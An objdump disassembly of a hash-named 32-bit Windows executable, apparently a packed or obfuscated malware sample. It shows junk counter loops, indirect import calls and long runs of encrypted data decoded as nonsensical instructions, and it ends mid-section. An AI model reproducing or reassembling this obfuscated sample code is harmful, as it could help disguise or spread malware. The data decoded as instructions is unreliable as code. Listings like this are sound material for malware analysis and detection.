
944335971c357635b46063cb2d73ea67bff62ebcf429d8fda5d90580858c3545.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     cl,cl
  4011b8:	add    eax,0x7e7e5a5a
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [eax+eax*1],ebx
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xc6cbb73a
  40126d:	jp     0x4012e1
  40126f:	lock outs dx,DWORD PTR ds:[esi]
  401271:	dec    ebx
  401272:	dec    ecx
  401273:	int    0x46
  401275:	add    al,0xdd
  401277:	out    0x99,al
  401279:	repz je 0x4fe4537d
  401280:	mov    al,ds:0xc2b1b78e
  401285:	ins    BYTE PTR es:[edi],dx
  401286:	mov    al,ds:0x5ef84741
  40128b:	fs clc 
  40128d:	aad    0x88
  40128f:	ret    
  401290:	aad    0x4
  401292:	(bad)  
  401293:	and    BYTE PTR [edx+0x1a5d8b2a],bl
  401299:	fcmove st,st(4)
  40129b:	lods   eax,DWORD PTR ds:[esi]
  40129c:	cdq    
  40129d:	dec    esi
  40129e:	sbb    ecx,DWORD PTR [ebp+0x38]
  4012a1:	or     edi,esp
  4012a3:	sti    
  4012a4:	inc    ecx
  4012a5:	push   0xfffffffe
  4012a7:	enter  0x8502,0xc6
  4012ab:	adc    eax,DWORD PTR [esi]
  4012ad:	xchg   DWORD PTR [edx-0x2e1be6c0],edx
  4012b3:	mov    cl,0x8f
  4012b5:	repz xor DWORD PTR [eax+0x4f],0x39
  4012ba:	mov    al,ds:0x7d192187
  4012bf:	aad    0x34
  4012c1:	push   edx
  4012c2:	outs   dx,DWORD PTR ds:[esi]
  4012c3:	sbb    esp,DWORD PTR [esi-0x6f8d87a5]
  4012c9:	enter  0xed52,0xea
  4012cd:	in     al,dx
  4012ce:	pop    ss
  4012cf:	stc    
  4012d0:	mov    esi,0x96fc280a
  4012d5:	hlt    
  4012d6:	shl    DWORD PTR [esi-0x55],cl
  4012d9:	mov    ebp,0x94c99176
  4012de:	ficomp DWORD PTR [edx+0x6ab6ad29]
  4012e4:	bound  eax,QWORD PTR [ebp-0x5b99ccb1]
  4012ea:	int3   
  4012eb:	xlat   BYTE PTR ds:[ebx]
  4012ec:	hlt    
  4012ed:	inc    esp
  4012ee:	jo     0x4012e7
  4012f0:	jbe    0x401314
  4012f2:	jp     0x4012dd
  4012f4:	(bad)  
  4012f5:	mov    edx,0x29e56802
  4012fa:	xchg   esp,eax
  4012fb:	retf   0x1aab
  4012fe:	xchg   esp,eax
  4012ff:	mov    esi,0x59e72aac
  401304:	mov    cl,0xc2
  401306:	mov    eax,ds:0xe8810936
  40130b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40130c:	dec    dx
  40130e:	push   ss
  40130f:	ins    BYTE PTR es:[edi],dx
  401310:	out    0xa0,al
  401312:	push   eax
  401313:	call   0xefbff544
  401318:	sub    eax,0x233790e0
  40131d:	outs   dx,DWORD PTR ds:[esi]
  40131e:	push   0x590080cb
  401323:	das    
  401324:	xchg   edi,eax
  401325:	jmp    0x401387
  401327:	fs rcl ebp,0x12
  40132b:	push   edx
  40132c:	pavgb  mm1,QWORD PTR [ecx-0x3]
  401330:	xor    BYTE PTR [ecx],dh
  401332:	sub    DWORD PTR [edx+ebp*8+0x6a],edi
  401336:	in     eax,0xff
  401338:	in     al,0x89
  40133a:	pop    esp
  40133b:	push   ebx
  40133c:	jg     0x4012e8
  40133e:	loop   0x4013b4
  401340:	cmp    al,0xcd
  401342:	sbb    edi,esi
  401344:	jecxz  0x401388
  401346:	ins    DWORD PTR es:[edi],dx
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	xchg   ebp,eax
  4013b4:	repnz cmp ch,BYTE PTR [edx-0x6]
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x40143c
  4013c0:	leave  
  4013c1:	fwait
  4013c2:	push   ebx
  4013c3:	add    cl,bh
  4013c5:	aam    0x99
  4013c7:	cmp    edx,DWORD PTR [ebx+ebx*4+0x69616134]
  4013ce:	xor    dl,BYTE PTR [edi-0x7d8484b9]
  4013d4:	dec    esi
  4013d5:	add    edi,DWORD PTR [ecx-0x1ac6de1d]
  4013db:	leave  
  4013dc:	cli    
  4013dd:	xor    al,0x38
  4013df:	cli    
  4013e0:	lods   al,BYTE PTR ds:[esi]
  4013e1:	cmc    
  4013e2:	cmp    al,0x28
  4013e4:	sbb    ch,dl
  4013e6:	lahf   
  4013e7:	xchg   edi,eax
  4013e8:	sbb    ah,BYTE PTR [ebx+ebx*8+0x5d]
  4013ec:	mov    eax,0x9f00a3b1
  4013f1:	pop    ebx
  4013f2:	pop    esi
  4013f3:	inc    edi
  4013f4:	cmp    eax,0xe8834ddd
  4013f9:	ja     0x4013e2
  4013fb:	loop   0x4013a7
  4013fd:	fadd   QWORD PTR [ecx]
  4013ff:	and    BYTE PTR [ecx],ch
  401401:	sbb    bl,bl
  401403:	push   es
  401404:	fs sti 
  401406:	neg    DWORD PTR [edi+0xaa936f7]
  40140c:	xchg   ebp,eax
  40140d:	or     al,0x55
  40140f:	call   DWORD PTR [ebx+0xbd3a1ce]
  401415:	repz jbe 0x4013c4
  401418:	or     bh,bl
  40141a:	pop    esp
  40141b:	sub    eax,ebp
  40141d:	cmp    dh,BYTE PTR [ebx+0x61]
  401420:	push   0x777f73f8
  401425:	push   edx
  401426:	dec    ecx
  401427:	xor    edi,esi
  401429:	dec    edi
  40142a:	jne    0x40143a
  40142c:	cli    
  40142d:	add    esp,DWORD PTR [ecx-0x1e]
  401430:	xchg   BYTE PTR [eax-0x7c69a305],bl
  401436:	ins    BYTE PTR es:[edi],dx
  401437:	mov    ebx,0x750f4138
  40143c:	xor    al,BYTE PTR [esi]
  40143e:	inc    esp
  40143f:	jb     0x4013d2
  401441:	mov    ch,0x62
  401443:	xchg   ecx,eax
  401444:	mov    bh,0xb0
  401446:	outs   dx,DWORD PTR ds:[esi]
  401447:	int3   
  401448:	popf   
  401449:	xchg   edx,eax
  40144a:	mov    al,0x5f
  40144c:	and    bh,dl
  40144e:	and    dh,ah
  401450:	mov    ebp,0x6cff70d8
  401455:	mov    esi,0x5c5cd33d
  40145a:	and    DWORD PTR [edx],ebx
  40145c:	ja     0x4014bd
  40145e:	inc    eax
  40145f:	test   eax,0x9b73efcf
  401464:	icebp  
  401465:	mov    bl,0x88
  401467:	sbb    ebp,DWORD PTR [ecx-0x3f]
  40146a:	imul   ecx,DWORD PTR [edi+esi*4-0x30e22ac9],0xfffffffe
  401472:	aaa    
  401473:	ret    
  401474:	jo     0x401436
  401476:	pushf  
  401477:	or     eax,0x61019af5
  40147c:	pop    ebx
  40147d:	popa   
  40147e:	mov    ecx,DWORD PTR [ecx]
  401480:	jae    0x4014d3
  401482:	dec    ebp
  401483:	enter  0xe9d5,0xc
  401487:	in     al,dx
  401488:	iret   
  401489:	inc    eax
  40148a:	jno    0x4014d6
  40148c:	aad    0x86
  40148e:	into   
  40148f:	adc    BYTE PTR [edx-0x4b9f56af],0xf7
  401496:	fsubr  QWORD PTR [ebx+eax*2+0x6f]
  40149a:	cmovae edi,DWORD PTR [ebx]
  40149d:	mov    ecx,0x9f2f991f
  4014a2:	rol    ebp,1
  4014a4:	push   ebx
  4014a5:	xchg   ecx,eax
  4014a6:	mov    ebp,0xca151661
  4014ab:	hlt    
  4014ac:	mov    edx,0x47c16ac1
  4014b1:	addr16 (bad) 
  4014b3:	out    0xf1,eax
  4014b5:	xchg   BYTE PTR [ebx+0x438e53e0],ch
  4014bb:	mov    eax,ds:0xc5d891f1
  4014c0:	call   0x6d78a525
  4014c5:	mov    eax,0x4b7cb4b9
  4014ca:	imul   esp,esi,0x398a826e
  4014d0:	ss nop
  4014d2:	hlt    
  4014d3:	mov    esp,0x87922e3
  4014d8:	ins    DWORD PTR es:[edi],dx
  4014d9:	in     eax,0x2c
  4014db:	(bad)
  4014de:	add    DWORD PTR [ebx+0x39],eax
  4014e1:	xchg   DWORD PTR [ecx-0x790fd638],esi
  4014e7:	jle    0x401520
  4014e9:	jbe    0x4014ed
  4014eb:	or     al,0x66
  4014ed:	dec    edi
  4014ee:	jnp    0x4014dd
  4014f0:	outs   dx,WORD PTR ds:[esi]
  4014f2:	daa    
  4014f3:	mov    edi,DWORD PTR [ebx+0x2d424a87]
  4014f9:	xchg   esp,eax
  4014fa:	jp     0x4014af
  4014fc:	in     eax,0x1c
  4014fe:	aaa    
  4014ff:	(bad)  
  401500:	fst    QWORD PTR ds:[esi-0x26]
  401504:	cmc    
  401505:	jb     0x4014e5
  401507:	lahf   
  401508:	shl    esp,cl
  40150a:	ret    
  40150b:	dec    esi
  40150c:	jns    0x4014f5
  40150e:	push   cs
  40150f:	push   ecx
  401510:	push   0x21
  401512:	ins    BYTE PTR es:[edi],dx
  401513:	or     DWORD PTR es:[ecx+0x65],ebp
  401517:	sub    DWORD PTR [ebp+0x66],edi
  40151a:	mov    BYTE PTR [edx+edi*2],bh
  40151d:	pop    ebx
  40151e:	sub    DWORD PTR [edi-0x68],edx
  401521:	es out dx,al
  401523:	fistp  QWORD PTR [ebx-0x35]
  401526:	mov    edx,0x5cd724de
  40152b:	dec    eax
  40152c:	loope  0x4014f4
  40152e:	enter  0x67ae,0xcf
  401532:	(bad)  
  401533:	and    al,0xd1
  401535:	or     eax,DWORD PTR [ebp+0x7269fcf1]
  40153b:	retf   0xf3d2
  40153e:	xchg   edx,eax
  40153f:	int    0x9d
  401541:	mov    edi,0xc4458b04
  401546:	xor    DWORD PTR ds:0x43360f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x2c7eb31d]
  401564:	rol    DWORD PTR [esi],0x7d
  401567:	jle    0x4015e7
  401569:	cli    
  40156a:	jg     0x4015ea
  40156c:	jle    0x401572
  40156e:	dec    BYTE PTR [eax-0x39ebea8]
  401574:	fidiv  WORD PTR [ebx+0x573be9fc]
  40157a:	adc    ch,BYTE PTR [edx]
  40157c:	ins    DWORD PTR es:[edi],dx
  40157d:	pop    ebx
  40157e:	jle    0x4015fb
  401580:	das    
  401581:	jmp    0x401571
  401583:	inc    ebp
  401584:	stos   DWORD PTR es:[edi],eax
  401585:	call   0xf9fe:0x3f07ec1b
  40158c:	jge    0x401532
  40158e:	enter  0xee63,0x87
  401592:	mov    eax,0x201e302d
  401597:	dec    edi
  401598:	or     al,0x4
  40159a:	cmp    al,ah
  40159c:	sub    BYTE PTR [edx+esi*8-0x61],0x35
  4015a1:	inc    edx
  4015a2:	int    0x3
  4015a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015a5:	dec    ecx
  4015a6:	add    eax,0xcfedddb1
  4015ab:	scas   eax,DWORD PTR es:[edi]
  4015ac:	js     0x401531
  4015ae:	sti    
  4015af:	cdq    
  4015b0:	pop    ds
  4015b1:	or     ch,BYTE PTR [ebx-0x18c6107f]
  4015b7:	adc    dh,ah
  4015b9:	dec    eax
  4015ba:	cmp    BYTE PTR [ecx+0x5c],al
  4015bd:	push   ds
  4015be:	mov    eax,ds:0xa2ee3620
  4015c3:	outs   dx,BYTE PTR fs:[esi]
  4015c5:	retf   
  4015c6:	mov    dh,0x0
  4015c8:	add    BYTE PTR [edi-0x34],dl
  4015cb:	sub    al,0x5f
  4015cd:	(bad)  
  4015ce:	into   
  4015cf:	into   
  4015d0:	xchg   edi,eax
  4015d1:	aaa    
  4015d2:	addr16 iret 
  4015d4:	and    DWORD PTR [ebp+0xe636b33],esp
  4015da:	ror    DWORD PTR [ebp+0x1ee8bb4d],0xc8
  4015e1:	call   0xc6ee:0xd1f36773
  4015e8:	and    dl,BYTE PTR [edx]
  4015ea:	pop    ecx
  4015eb:	xlat   BYTE PTR ds:[ebx]
  4015ec:	(bad)  
  4015ee:	mov    ch,0x80
  4015f0:	pop    edi
  4015f1:	jl     0x4015a7
  4015f3:	cdq    
  4015f4:	icebp  
  4015f5:	xchg   DWORD PTR [ecx+edi*1+0x409ed51d],eax
  4015fc:	cmp    ecx,ebx
  4015fe:	in     al,dx
  4015ff:	inc    ecx
  401600:	add    dl,ah
  401602:	(bad)  
  401603:	and    bl,BYTE PTR [eax-0xb652aa8]
  401609:	outs   dx,DWORD PTR ds:[esi]
  40160a:	push   esp
  40160b:	and    bl,BYTE PTR [esi-0x22]
  40160e:	(bad)  
  401610:	add    DWORD PTR [esi+0x159918f9],esp
  401616:	pop    ss
  401617:	push   0xfffffffa
  401619:	cmp    esp,ebx
  40161b:	leave  
  40161c:	mov    eax,0xad1cba4d
  401621:	nop/reserved BYTE PTR [edx+edx*2-0x6295024]
  401629:	mov    DWORD PTR [eax-0x66822c3a],ebx
  40162f:	mov    ch,0x29
  401631:	test   eax,0xfb980770
  401636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401638:	sub    dl,BYTE PTR [edi+0x5af18e71]
  40163e:	cmp    al,0x37
  401640:	lods   al,BYTE PTR ds:[esi]
  401641:	sbb    DWORD PTR [ebp-0x72eba34b],eax
  401647:	iret   
  401648:	rcr    DWORD PTR [eax+eiz*8+0xd],1
  40164c:	lds    ebx,FWORD PTR [edi]
  40164e:	imul   eax,DWORD PTR [ecx],0xc
  401651:	repnz inc ecx
  401653:	fstp   QWORD PTR [ebp-0x13200a86]
  401659:	dec    edx
  40165a:	into   
  40165b:	lods   eax,DWORD PTR ds:[esi]
  40165c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165d:	jecxz  0x4015f1
  40165f:	in     al,dx
  401660:	es pop esp
  401662:	mov    WORD PTR [eax+0x2c],?
  401665:	dec    edx
  401666:	push   esp
  401667:	dec    esi
  401668:	or     eax,0x4bdb6898
  40166d:	and    DWORD PTR [esi],esi
  40166f:	jecxz  0x40168b
  401671:	jmp    0x4016b8
  401673:	xchg   ebx,eax
  401674:	mov    dh,0xd7
  401676:	in     eax,dx
  401677:	cmc    
  401678:	and    eax,DWORD PTR [ecx+edi*2]
  40167b:	test   esp,ecx
  40167d:	sbb    eax,ebx
  40167f:	das    
  401680:	pop    esi
  401681:	in     eax,dx
  401682:	fs js  0x4016fb
  401685:	fmul   DWORD PTR [ebp+0x59217040]
  40168b:	cld    
  40168c:	mov    bh,0xc4
  40168e:	push   edi
  40168f:	pop    ebx
  401690:	adc    esp,DWORD PTR [esi]
  401692:	sti    
  401693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401694:	das    
  401695:	push   ebx
  401696:	add    cl,BYTE PTR [esp+ebx*4]
  401699:	ds inc ecx
  40169b:	imul   DWORD PTR [edx+0x72]
  40169e:	mov    ebx,0xcd513d76
  4016a3:	inc    BYTE PTR [ebp-0x38ac04ad]
  4016a9:	int    0x19
  4016ab:	pop    ds
  4016ac:	xor    al,0x98
  4016ae:	jmp    0x902b:0x5a23e480
  4016b5:	jmp    0x1d1fcde
  4016ba:	cmc    
  4016bb:	rol    al,cl
  4016bd:	adc    edi,DWORD PTR [eax]
  4016bf:	push   0xffffff8e
  4016c1:	fsubrp st(5),st
  4016c3:	mov    ds:0x202214c0,al
  4016c8:	jo     0x401738
  4016ca:	shl    BYTE PTR [edi+0x78d1704d],cl
  4016d0:	aas    
  4016d1:	popa   
  4016d2:	pop    esi
  4016d3:	test   eax,0x3204a147
  4016d8:	inc    edx
  4016d9:	imul   ebp,DWORD PTR [ebp-0x42],0xffffffc5
  4016dd:	mov    dh,0xe3
  4016df:	push   eax
  4016e0:	scas   eax,DWORD PTR es:[edi]
  4016e1:	fs push ss
  4016e3:	mov    ebp,gs
  4016e5:	xor    edi,edx
  4016e7:	inc    ebp
  4016e8:	pop    edi
  4016e9:	enter  0x2a1a,0x84
  4016ed:	cld    
  4016ee:	and    esp,DWORD PTR [ecx]
  4016f0:	mov    eax,ds:0x4589c703
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x97c16ade
  4018e9:	mov    ebx,esp
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018ce
  4018f4:	clc    
  4018f5:	mov    edx,0x78801301
  4018fa:	push   cs
  4018fb:	neg    ebp
  4018fd:	aas    
  4018fe:	ds dec eax
  401900:	test   eax,0xbda05563
  401905:	cwde   
  401906:	cmp    eax,DWORD PTR [edi+0x6fe90b45]
  40190c:	xchg   DWORD PTR [eax+0x49bd323d],ecx
  401912:	mov    bh,0x37
  401914:	jnp    0x40192c
  401916:	sub    bl,dl
  401918:	mov    eax,0xa9a45163
  40191d:	jb     0x40190d
  40191f:	xchg   edi,eax
  401920:	push   esp
  401921:	mov    es,WORD PTR [ebp-0xe]
  401924:	(bad)  
  401925:	and    al,0xbf
  401927:	call   0xaba457f9
  40192c:	mov    ch,0xf1
  40192e:	jp     0x4018f4
  401930:	jno    0x4018f2
  401932:	xchg   ebp,eax
  401933:	push   ds
  401934:	lods   al,BYTE PTR ds:[esi]
  401935:	shl    BYTE PTR [ecx+0x7d],cl
  401938:	dec    edx
  401939:	xor    DWORD PTR [eax-0x4b],edi
  40193c:	mov    ah,0x14
  40193e:	dec    ecx
  40193f:	cmp    DWORD PTR [edx-0x8cab34e],edx
  401945:	test   BYTE PTR [eax-0x468e9256],bl
  40194b:	leave  
  40194c:	(bad)  
  40194d:	int3   
  40194e:	jle    0x40197e
  401950:	imul   edx,DWORD PTR [ebx+0x5c],0xf18d42d7
  401957:	add    eax,0x2933197a
  40195c:	daa    
  40195d:	jnp    0x4019a9
  40195f:	jae    0x4018e7
  401961:	setnp  BYTE PTR [ebx-0x35ba6889]
  401968:	out    0xa6,al
  40196a:	(bad)  
  40196b:	mov    ah,0xbe
  40196d:	nop
  40196e:	dec    edx
  40196f:	rcl    esp,1
  401971:	add    ah,dl
  401973:	push   ecx
  401974:	imul   esp,DWORD PTR [ecx+0x2ef74f54],0xfffffffa
  40197b:	stos   BYTE PTR es:[edi],al
  40197c:	xchg   edi,eax
